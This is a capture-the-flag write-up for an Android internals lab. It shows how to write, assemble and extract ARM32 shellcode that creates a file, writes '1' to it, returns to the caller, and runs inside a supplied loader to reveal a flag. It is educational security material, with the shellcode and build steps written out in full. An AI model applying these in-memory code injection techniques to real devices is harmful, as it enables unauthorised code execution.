# Shellcode

My write up is also available at [dev.to/wireless90](https://dev.to/wireless90/shellcode-android-internals-ctf-ex4-4357)

Get the [executable here](https://github.com/wireless90/AndroidInternalsCTF/tree/main/Shellcode)

- Your task is to write a shellcode which writes '1' to /data/local/tmp/is_admin. 
- It doesn't have to be null terminated, and be compiled as arm assembly (not thumb). 
- Run a.out with path as a parameter to your shellcode. 
- Do not reverse a.out

Lets first start to inspect the binary.

```sh
──(razali㉿razali)-[~/…/Ivy/AndroidVulnResearch/ctf/shellcode]
└─$ chmod +x a.out 
                                                                                                                                                                                                                                             
┌──(razali㉿razali)-[~/…/Ivy/AndroidVulnResearch/ctf/shellcode]
└─$ file a.out 
a.out: ELF 32-bit LSB shared object, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /system/bin/linker, with debug_info, not stripped
                                                                                                                                                                                                                                             
┌──(razali㉿razali)-[~/…/Ivy/AndroidVulnResearch/ctf/shellcode]
└─$ adb devices            
* daemon not running; starting now at tcp:5037
* daemon started successfully
List of devices attached

                                                                                                                                                                                                                                             
┌──(razali㉿razali)-[~/…/Ivy/AndroidVulnResearch/ctf/shellcode]
└─$ adb push a.out /data/local/tmp
a.out: 1 file pushed. 0.2 MB/s (44596 bytes in 0.176s)
```

It seems to be an `arm 32-bit executable`. So I have pushed it to my android device using `adb`.


So it seems we are not supposed to reverse the binary. 

Lets start by writing some arm assembly.

In order to compile assembly for arm, I have downloaded the [ndk-tools here](https://developer.android.com/ndk/downloads).

I want to start writing an assembly template that simply runs and exits.

```nasm

.section .text
.global _start

_start:

exit:
        mov r0, #0 //any error code
        mov r7, #1 //syscall # for exit
        svc #0


.section .data


```

The system calls and their arguments can be [found here](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#arm-32_bit_EABI).

The system call number for `exit` is `1`, which we store inside `r7`. We need to specify an error code as the first argument, which we specified as `0` into `r0`. 

A supervisor call is an instruction sent to a computer's processor that directs it to transfer computer control to the operating system's supervisor program with more priviledges to run the command. This is done through the command `svc`.

Alright, now that we have a assembly(useless) program, lets compile it. We will be using the assembly compiler, `as` and the linker, `ld`.

Lets find these programs.

```sh
┌──(razali㉿razali)-[~/…/Ivy/AndroidVulnResearch/ctf/shellcode]
└─$ find ~/Downloads/android-ndk-r21e/. -name "*as"
.
.
. 
/home/razali/Downloads/android-ndk-r21e/./toolchains/arm-linux-androideabi-4.9/prebuilt/linux-x86_64/arm-linux-androideabi/bin/as
.
.
.
omitted

```

There we have found our assembly compiler. The linker is also in the same directory. To make it easier for us, lets create a shell script that will help us compile, link, and push the executable to our android device.

```sh
┌──(razali㉿razali)-[~/…/Ivy/AndroidVulnResearch/ctf/shellcode]
└─$ vim commands.sh
```

```sh
export ndk=/home/razali/Downloads/android-ndk-r21e/toolchains/arm-linux-androideabi-4.9/prebuilt/linux-x86_64/arm-linux-androideabi/bin

$ndk/as shellcode.s -o shellcode.o
$ndk/ld shellcode.o -o shellcode
adb push ./shellcode /data/local/tmp

```

Now lets compile and push our assembly program.

```sh
┌──(razali㉿razali)-[~/…/Ivy/AndroidVulnResearch/ctf/shellcode]
└─$ chmod +x commands.sh
                                                                                                 
┌──(razali㉿razali)-[~/…/Ivy/AndroidVulnResearch/ctf/shellcode]
└─$ ./commands.sh
./shellcode: 1 file pushed. 0.1 MB/s (4740 bytes in 0.040s)

```

In our android device, lets run the program.

```sh
root@hammerhead:/data/local/tmp # ./shellcode
root@hammerhead:/data/local/tmp # 

```

Great! No errors.

We need a few system calls to
- [ ] Create a file
- [ ] Write '1' to the file
- [ ] Close the file



# Creating a file

The [creat](https://linux.die.net/man/2/creat) system call has the following function prototype.
```c
int creat(const char *pathname, mode_t mode);
```
The [information here](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#arm-32_bit_EABI) says that .
`r0` - contains the pointer to the file path. Based on the instructions for this exercise, our file name is `is_admin`.

`r1` - the access modes: `O_RDONLY, O_WRONLY, or O_RDWR`. These request opening the file read-only, write-only, or read/write, respectively.

In our case, we need `O_WRONLY`. We can see [from here](https://sites.uclouvain.be/SystInfo/usr/include/asm-generic/fcntl.h.html), that `O_WRONLY` is defined to be `1`.

`r7` would be `0x08`.

`ret` - The return value would be the `file descriptor`, and would be stored in `r0`.

Our assembly code now would look something like,
```nasm
.section .text
.global _start

_start:

create:
        ldr r0, =filename
        mov r1, #1 //WRITE ONLY
        mov r7, #0x8 //CREAT SYS CALL
        svc #0
exit:
        mov r0, #0 //any error code
        mov r7, #1 //syscall # for exit
        svc #0


.section .data

filename:
        .asciz "is_admin"
```

# Closing the file

- [X] Create a file
- [ ] Write '1' to the file
- [ ] Close the file

Next lets close the file, by calling the syscall `close`.


The [close](https://linux.die.net/man/2/close) system call has the following function prototype.
```c
int close(int fd);
```

The [information here](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#arm-32_bit_EABI) says that .

`r0` - represents the file descriptor
`r7` - `0x06` which represents the `close` system call


```nasm
.section .text
.global _start

_start:

create:
        ldr r0, =filename
        mov r1, #1 //WRITE ONLY
        mov r7, #0x8 //CREAT SYS CALL
        svc #0

        //The file descriptor(fd) is returned into the r0 variable.
        //Store the file descriptor to the stack.
        //This way, we can reuse r0 for other functions and when the fd is needed,
        //we simply pop from the stack
        push {r0}

close:
        pop {r0} //pop the file descriptor back
        mov r7, #0x06 //syscall for close
        svc #0

exit:
        mov r0, #0 //any error code
        mov r7, #1 //syscall # for exit
        svc #0


.section .data

filename:
        .asciz "is_admin"

```

Now lets compile and push our assembly program.

```sh
                                                                          ┌──(razali㉿razali)-[~/…/Ivy/AndroidVulnResearch/ctf/shellcode]
└─$ ./commands.sh
./shellcode: 1 file pushed. 0.1 MB/s (4740 bytes in 0.040s)

```

In our android device, lets run the program.

```sh
root@hammerhead:/data/local/tmp # ./shellcode
root@hammerhead:/data/local/tmp # 
root@hammerhead:/data/local/tmp # ls | grep is_admin                                                                      
is_admin                                                     
root@hammerhead:/data/local/tmp # cat is_admin               
root@hammerhead:/data/local/tmp #   

```
It successfully created an empty file `is_admin`.

# Writing to the file

- [X] Create a file
- [ ] Write '1' to the file
- [X] Close the file

Next lets write to the file, by calling the syscall `write`.


The [write](https://linux.die.net/man/2/write) system call has the following function prototype.
```c
ssize_t write(int fd, const void *buf, size_t count);
```
The [information here](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#arm-32_bit_EABI) says that .

`r0` - represents the file descriptor
`r1` - represents the buffer which contains the text to write, in our case, we want to write `1`
`r2` - represents the number of bytes to write, we only need to write 1 character thus 1 byte
`r7` - `0x04` which represents the `write` system call

```nasm
.section .text
.global _start

_start:

create:
        ldr r0, =filename
        mov r1, #1 //WRITE ONLY
        mov r7, #0x8 //CREAT SYS CALL
        svc #0

        //The file descriptor(fd) is returned into the r0 variable.
        //Store the file descriptor to the stack.
        //This way, we can reuse r0 for other functions and when the fd is needed,
        //we simply pop from the stack
        push {r0}

write:
        mov r0, r0 //r0 already contains the file descriptor
        ldr r1, =toWrite //buffer
        mov r2, #1 //write only 1 byte
        mov r7, #0x04 //syscall for write
        svc #0

close:
        pop {r0} //pop the file descriptor back
        mov r7, #0x06 //syscall for close
        svc #0

exit:
        mov r0, #0 //any error code
        mov r7, #1 //syscall # for exit
        svc #0


.section .data

filename:
        .asciz "is_admin"

toWrite:
        .asciz "1"
```

Now lets compile and push our assembly program.

```sh
                                                             ┌──(razali㉿razali)-[~/…/Ivy/AndroidVulnResearch/ctf/shellcode]
└─$ ./commands.sh
./shellcode: 1 file pushed. 0.1 MB/s (4740 bytes in 0.040s)

```

In our android device, lets run the program.

```sh
root@hammerhead:/data/local/tmp # cat is_admin                                                                            
1
root@hammerhead:/data/local/tmp #    

```

Great! We have written to the file!

# Generating the shell code

- [X] Create a file
- [X] Write '1' to the file
- [X] Close the file

Our objective is to pass our shellcode to `a.out` which will read in our shellcode and execute in memory. 

Let's try to do that.

```sh
root@hammerhead:/data/local/tmp # ./a.out                                                                                 
usage: ./a.out <SHELLCODE_PATH>    
           
root@hammerhead:/data/local/tmp # ./a.out ./shellcode
executing shellcode
[2] + Stopped (signal)     ./a.out ./shellcode 
[1] - Illegal instruction  ./a.out ./shellcode 

```

Seems to crash with an `Illegal instruction`. 
What we are passing is the entire elf binary, **which is wrong**.

```sh
┌──(razali㉿razali)-[~/…/Ivy/AndroidVulnResearch/ctf/shellcode]
└─$ xxd shellcode
00000000: 7f45 4c46 0101 0100 0000 0000 0000 0000  .ELF............
00000010: 0200 2800 0100 0000 7480 0000 3400 0000  ..(.....t...4...
00000020: b411 0000 0002 0005 3400 2000 0200 2800  ........4. ...(.
00000030: 0900 0800 0100 0000 0000 0000 0080 0000  ................
00000040: 0080 0000 c800 0000 c800 0000 0500 0000  ................
00000050: 0010 0000 0100 0000 0010 0000 0090 0000  ................
00000060: 0090 0000 0000 0000 0000 0000 0600 0000  ................
00000070: 0010 0000 4400 9fe5 0110 a0e3 0870 a0e3  ....D........p..
00000080: 0000 00ef 0400 2de5 0000 a0e1 3010 9fe5  ......-.....0...
00000090: 0120 a0e3 0470 a0e3 0000 00ef 0400 9de4  . ...p..........
000000a0: 0670 a0e3 0000 00ef 0000 a0e3 0170 a0e3  .p...........p..
000000b0: 0000 00ef 6973 5f61 646d 696e 0031 0000  ....is_admin.1..
000000c0: b480 0000 bd80 0000 0000 0000 0000 0000  ................
000000d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000100: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000110: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000120: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000130: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000140: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000150: 0000 0000 0000 0000 0000 0000 0000 0000  ................

```

What we need to do is think in terms of `a.out`. It is gonna read our shellcode and place it in either the stack or the heap. Then it is probably going to create a function pointer to execute our shell code. When a function is executed, the `link register` is filled with the return address that the function need to return to after executing.

We thus need to first, put all the code into just one section, lets say the `.text` section, then remove the `exit` call. Our code is going to act like a function, thus we do not need the `exit`. Lastly once our function is done, we are going to branch to whatever the link register is at.

The code would look something like this.
```nasm
.section .text
.global _start

_start:

create:
        ldr r0, =filename
        mov r1, #1 //WRITE ONLY
        mov r7, #0x8 //CREAT SYS CALL
        svc #0

        //The file descriptor(fd) is returned into the r0 variable.
        //Store the file descriptor to the stack.
        //This way, we can reuse r0 for other functions and when the fd is needed,
        //we simply pop from the stack
        push {r0}

write:
        mov r0, r0 //r0 already contains the file descriptor
        ldr r1, =toWrite //buffer
        mov r2, #1 //write only 1 byte
        mov r7, #0x04 //syscall for write
        svc #0

close:
        pop {r0} //pop the file descriptor back
        mov r7, #0x06 //syscall for close
        svc #0

branch:
        //end of this function, lets branch back
        bx lr


filename:
        .asciz "is_admin"

toWrite:
        .asciz "1"

```

Now lets compile and push our assembly program.

```sh
┌──(razali㉿razali)-[~/…/Ivy/AndroidVulnResearch/ctf/shellcode]
└─$ ./commands.sh
./shellcode: 1 file pushed. 0.1 MB/s (4740 bytes in 0.040s)

```

Remember the `xxd` command above? It showed the contents of the `shellcode` file. We only need the text section.

```sh
┌──(razali㉿razali)-[~/…/Ivy/AndroidVulnResearch/ctf/shellcode]
└─$ $ndk/objcopy -O binary --only-section=.text shellcode shellcode.bin
```

```sh
┌──(razali㉿razali)-[~/…/Ivy/AndroidVulnResearch/ctf/shellcode]
└─$ xxd shellcode.bin
00000000: 4400 9fe5 0110 a0e3 0870 a0e3 0000 00ef  D........p......
00000010: 0400 2de5 0000 a0e1 3010 9fe5 0120 a0e3  ..-.....0.... ..
00000020: 0470 a0e3 0000 00ef 0400 9de4 0670 a0e3  .p...........p..
00000030: 0000 00ef 0000 a0e3 0170 a0e3 0000 00ef  .........p......
00000040: 6973 5f61 646d 696e 0031 0000 b480 0000  is_admin.1......
00000050: bd80 0000 
```
```sh
┌──(razali㉿razali)-[~/…/Ivy/AndroidVulnResearch/ctf/shellcode]
└─$ adb push shellcode.bin /data/local/tmp
shellcode.bin: 1 file pushed. 0.0 MB/s (84 bytes in 0.029s)
```

Lets run it in android.

```sh
root@hammerhead:/data/local/tmp # ./a.out shellcode.bin                        
executing shellcode
/data/local/tmp/is_admin still contains 0 :(
root@hammerhead:/data/local/tmp # ./a.out shellcode.bin                        
```

Hmm. The shellcode now seems not properly creating our file or writing our strings.

The problem here is with the `ldr` load instruction, which we need to change to a relative instruction, `adr`. More information about it can be found [here](https://www.programmersought.com/article/2748493965/).

Now our final code looks like this.

```nasm
.section .text
.global _start

_start:

create:
        adr r0, filename
        mov r1, #1 //WRITE ONLY
        mov r7, #0x8 //CREAT SYS CALL
        svc #0

        //The file descriptor(fd) is returned into the r0 variable.
        //Store the file descriptor to the stack.
        //This way, we can reuse r0 for other functions and when the fd is needed,
        //we simply pop from the stack
        push {r0}

write:
        mov r0, r0 //r0 already contains the file descriptor
        adr r1, toWrite //buffer
        mov r2, #1 //write only 1 byte
        mov r7, #0x04 //syscall for write
        svc #0

close:
        pop {r0} //pop the file descriptor back
        mov r7, #0x06 //syscall for close
        svc #0

branch:
        //end of this function, lets branch back
        bx lr


filename:
        .asciz "is_admin"

toWrite:
        .asciz "1"

```

Lets compile and push it to android.

```sh
┌──(razali㉿razali)-[~/…/Ivy/AndroidVulnResearch/ctf/shellcode]
└─$ ./commands.sh
./shellcode: 1 file pushed. 0.1 MB/s (4740 bytes in 0.040s)


┌──(razali㉿razali)-[~/…/Ivy/AndroidVulnResearch/ctf/shellcode]
└─$ $ndk/objcopy -O binary --only-section=.text shellcode shellcode.bin

┌──(razali㉿razali)-[~/…/Ivy/AndroidVulnResearch/ctf/shellcode]
└─$ adb push shellcode.bin /data/local/tmp
shellcode.bin: 1 file pushed. 0.0 MB/s (84 bytes in 0.029s)
                   
```


And lets run it finally in android again.

```sh
root@hammerhead:/data/local/tmp # ./a.out shellcode.bin                        
executing shellcode
You did it!
The flag is: "you_got_the_power"
```

For this excercise, I learnt how to write a simple arm assembly program which creates, writes and closes a file. I also learnt about extracting out the binary file from a elf file which will be used as a shellcode. Lastly, I learnt about the `adr` command vs the `ldr` command.